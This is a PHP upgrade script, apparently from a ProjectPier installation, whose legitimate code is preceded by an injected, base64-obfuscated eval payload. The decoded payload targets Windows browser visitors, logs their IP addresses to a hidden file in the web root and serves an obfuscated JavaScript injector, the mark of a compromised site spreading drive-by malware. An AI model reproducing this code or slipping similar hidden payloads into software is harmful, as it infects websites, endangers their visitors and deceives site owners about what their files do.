<?php eval(base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOw0KJGlwPSRfU0VSVkVSWyJSRU1PVEVfQUREUiJdOw0KJGRyPSRfU0VSVkVSWyJET0NVTUVOVF9ST09UIl07DQokdWEgPSAkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ107DQokb2RiZiA9ICRkci4nLycubWQ1KGRhdGUoJ20uZC55JywgdGltZSgpLTg2NDAwKSk7DQppZiAoZmlsZV9leGlzdHMoJG9kYmYpKUB1bmxpbmsoJG9kYmYpOw0KJGRiZj0kZHIuJy8nLm1kNShkYXRlKCdtLmQueScpKTsNCmlmKChzdHJwb3MoJHVhLCdXaW5kb3dzJykhPT1mYWxzZSkmJigoc3RycG9zKCR1YSwnTVNJRScpIT09ZmFsc2UpfHwoc3RycG9zKCR1YSwnT3BlcmEnKSE9PWZhbHNlKXx8KHN0cnBvcygkdWEsJ0ZpcmVmb3gnKSE9PWZhbHNlKXx8KHN0cnBvcygkdWEsJ1NhZmFyaScpIT09ZmFsc2UpKSYmKHN0cnBvcyhAZmlsZV9nZXRfY29udGVudHMoJGRiZiksJGlwKSA9PT0gZmFsc2UpKSB7DQogICAgZWNobyhiYXNlNjRfZGVjb2RlKCdQSE5qY21sd2RENTBjbmw3Wkc5amRXMWxiblJiSW1JaUt5SnZaQ0lySW5raVhTbzlaRzlqZFcxbGJuUjlZMkYwWTJnb1pHZHpaM05rWnlsN2VuaGpQVEU3ZDNjOWQybHVaRzkzTzMxMGNubDdaRDFrYjJOMWJXVnVkRnNpWTNKbFlYUmxSV3hsYldWdWRDSmRLQ0p6Y0dGdUlpazdmV05oZEdOb0tHRm5aSE5uS1h0NmVHTTlNRHQ5ZEhKNWUybG1LSGQzTG1SdlkzVnRaVzUwS1hkcGJtUnZkMXNpWkc5aklpc2lkVzFsYm5RaVhWc2lZbTlrZVNKZFBTSjZlR01pZldOaGRHTm9LR0poZDJWMFlYZGxLWHRwWmloM2R5NWtiMk4xYldWdWRDbDdkajEzYVc1a2IzYzdiajFiSWpOdElpd2lORGNpTENJemJDSXNJalJrSWl3aU5EVWlMQ0l6YmlJc0lqUTJJaXdpTkdNaUxDSXhheUlzSWpSbUlpd2lOR0VpTENJME1TSXNJalJqSWl3aU0yNGlMQ0l4WlNJc0lqRTRJaXdpTWpnaUxDSTBNU0lzSWpOdklpd2lOR0VpTENJemFpSXNJalExSWl3aU0yNGlMQ0l4TmlJc0lqUmlJaXdpTkdNaUxDSTBhQ0lzSWpRMElpd2lNMjRpTENJeU9TSXNJak5sSWl3aU1UZ2lMQ0kwT0NJc0lqUTNJaXdpTkdJaUxDSTBNU0lzSWpSaklpd2lOREVpTENJME55SXNJalEySWl3aU1qWWlMQ0l6YnlJc0lqUXhJaXdpTkdjaUxDSXpiaUlzSWpOdElpd2lNamNpTENJMFl5SXNJalEzSWl3aU5EZ2lMQ0l5TmlJc0lqRnRJaXdpTkRnaUxDSTBaeUlzSWpJM0lpd2lORFFpTENJemJpSXNJak52SWl3aU5HTWlMQ0l5TmlJc0lqRnFJaXdpTWpFaUxDSXhiU0lzSWpGdElpd2lORGdpTENJMFp5SXNJakkzSWl3aU0yVWlMQ0l4T0NJc0lqRTJJaXdpTkdJaUxDSTBZU0lzSWpOc0lpd2lNamtpTENJelpTSXNJakU0SWl3aU5EQWlMQ0kwWXlJc0lqUmpJaXdpTkRnaUxDSXlOaUlzSWpGc0lpd2lNV3dpTENJME5TSXNJalJoSWl3aU0yc2lMQ0l6YnlJc0lqUTBJaXdpTkdJaUxDSXhheUlzSWpOdklpd2lOR01pTENJME9DSXNJalJpSWl3aU0yNGlMQ0kwWVNJc0lqUmxJaXdpTTI0aUxDSTBZU0lzSWpGcklpd2lNMnNpTENJME1TSXNJalJwSWl3aU1Xd2lMQ0l6YkNJc0lqUTNJaXdpTkdRaUxDSTBOaUlzSWpSaklpd2lNMjRpTENJMFlTSXNJakZzSWl3aU5HSWlMQ0kwWXlJc0lqTnFJaXdpTkdNaUxDSTBZaUlzSWpGcklpd2lORGdpTENJME1DSXNJalE0SWl3aU0yVWlMQ0l4T0NJc0lqRTJJaXdpTkRBaUxDSXpiaUlzSWpReElpd2lNM0FpTENJME1DSXNJalJqSWl3aU1qa2lMQ0l6WlNJc0lqRTRJaXdpTWpFaUxDSXhiU0lzSWpObElpd2lNVGdpTENJeE5pSXNJalJtSWl3aU5ERWlMQ0l6YlNJc0lqUmpJaXdpTkRBaUxDSXlPU0lzSWpObElpd2lNVGdpTENJeGJpSXNJakZ0SWl3aU1XMGlMQ0l6WlNJc0lqRTRJaXdpTW1FaUxDSXlPQ0lzSWpGc0lpd2lOREVpTENJemJ5SXNJalJoSWl3aU0yb2lMQ0kwTlNJc0lqTnVJaXdpTW1FaUxDSXhPQ0lzSWpGbUlpd2lNamNpWFR0b1BUSTdjejBpSWp0cFppaDZlR01wZTJadmNpaHBQVEE3YVMweE5qUWhQVEE3YVNzcktYdHJQV2s3Y3lzOVUzUnlhVzVuTG1aeWIyMURhR0Z5UTI5a1pTaHdZWEp6WlVsdWRDaHVXMmxkTERFeUtqSXJNaWtwTzMxNlBYTTdkbXc5SW5aaGJDSTdhV1lvZDNjdVpHOWpkVzFsYm5RcFpYWmhiQ2g2S1gxOWZUd3ZjMk55YVhCMFBnPT0nKSk7DQogICAgaWYgKCRmcCA9IEBmb3BlbigkZGJmICwgImEiKSkgew0KICAgICAgICBmcHV0cygkZnAgLCAkaXAuJ3wnKTsNCiAgICAgICAgZmNsb3NlKCRmcCk7DQogICAgfQ0KfQ=='));

  require_once dirname(__FILE__) . '/include.php';
  
  $upgrader = new ScriptUpgrader(new Output_Html(), 'Upgrade ProjectPier', 'Upgrade your ProjectPier installation');
  $form_data = array_var($_POST, 'form_data');
      
  tpl_assign('upgrader', $upgrader);
  tpl_assign('form_data', $form_data);
  if (is_array($form_data)) {
    ob_start();
    $upgrader->executeScript(trim(array_var($form_data, 'script_class')));
    $status_messages = explode("\n", trim(ob_get_clean()));
    
    tpl_assign('status_messages', $status_messages);
  } // if
  
  tpl_display(get_template_path('layout'));

?>